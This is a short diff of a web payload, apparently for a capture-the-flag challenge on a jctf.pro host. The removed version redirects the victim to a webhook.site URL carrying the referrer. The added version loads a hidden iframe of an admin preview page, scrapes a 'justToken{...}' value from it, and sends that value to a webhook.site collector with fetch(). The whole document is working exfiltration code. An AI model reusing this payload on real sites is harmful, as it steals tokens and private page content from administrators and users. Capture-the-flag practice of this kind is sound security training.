@@ -1,7 +1,17 @@
+<iframe id="adminFrame" src="http://l25r4lfr9v2hgmwj06jk3nn591q1hd.simpletasks.web.jctf.pro/tasks/preview/0/0" style="display:none;"></iframe>
+
 <script>
-// 檢查 referrer 或 URL hash
-if (document.referrer.includes('localhost:3000')) {
-  // 嘗試從 referrer 提取信息
-  window.location = 'https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?ref=' + encodeURIComponent(document.referrer);
-}
+// 监听iframe加载完成
+document.getElementById('adminFrame').onload = function() {
+  // 尝试读取iframe内容（如果同源策略允许）
+  try {
+    const content = this.contentDocument.body.innerHTML;
+    const token = content.match(/justToken\{([^}]+)\}/)?.[1];
+    if (token) {
+      fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?token=' + token);
+    }
+  } catch(e) {
+    console.log('Same-origin policy blocked');
+  }
+};
 </script>
